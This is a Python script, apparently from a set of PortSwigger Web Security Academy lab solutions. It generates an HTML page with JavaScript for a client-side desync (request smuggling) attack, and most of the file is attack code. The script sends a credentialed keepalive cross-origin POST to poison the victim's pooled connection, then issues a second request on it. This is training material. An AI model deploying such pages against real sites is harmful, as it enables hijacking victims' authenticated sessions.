"""
Lab 21: Client-side desync
https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync
Difficulty: Practitioner

📝 Different delivery model from every other lab here — no front-end/back-
end pair needed. The VICTIM's own browser gets tricked into desyncing its
connection to the target: a crafted cross-origin POST (sent via fetch(),
with `keepalive` so the TCP connection stays open and pooled) carries a
body the server under-reads relative to what it declared — leaving bytes
dangling on the connection. The browser then reuses that SAME pooled
connection for the victim's next navigation/request, which gets corrupted
by (or has its response hijacked alongside) our dangling bytes.

The exploit itself is a page hosted on the exploit server, not a Python
script sending requests — this script generates that page.
"""

from utils import log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def build_csd_poc():
    note("Two fetches: the first desyncs the connection (server reads fewer")
    note("bytes than Content-Length declares), the second rides the same")
    note("pooled connection and gets its response corrupted/hijacked.")

    return f"""<script>
async function go() {{
  // Step 1: desync request. mode 'no-cors' keeps this as a simple cross-
  // origin request (no preflight), keepalive keeps the connection pooled
  // for reuse by the browser's own subsequent navigation.
  await fetch('{TARGET}/', {{
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    keepalive: true,
    headers: {{'Content-Type': 'text/plain'}},
    // Deliberately-short body relative to a Content-Length the server is
    // tricked into expecting is longer (exact desync shape depends on the
    // target's specific parsing quirk — confirm via Burp's HTTP/2 or
    // desync-testing tooling against the live instance first).
    body: 'x=1',
  }});

  // Step 2: navigate (or fetch again) on the same connection — if desynced,
  // this request/response gets corrupted in a way that's observable (e.g.
  // the response body contains fragments of an unrelated response).
  const r = await fetch('{TARGET}/', {{mode: 'no-cors', credentials: 'include'}});
  console.log('second response status (opaque under no-cors):', r.status);
}}
go();
</script>"""


def run():
    html = build_csd_poc()
    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC scaffold to {out_path}")

    note("This is a starting scaffold, not a guaranteed-working payload —")
    note("client-side desync depends on exact byte-level behavior that")
    note("varies per target and is normally discovered using Burp's")
    note("dedicated desync-testing features against the live lab first.")
    note("Host on the exploit server and Deliver to victim once the precise")
    note("desync trigger (confirmed via Burp) is encoded in the body above.")


if __name__ == "__main__":
    run()
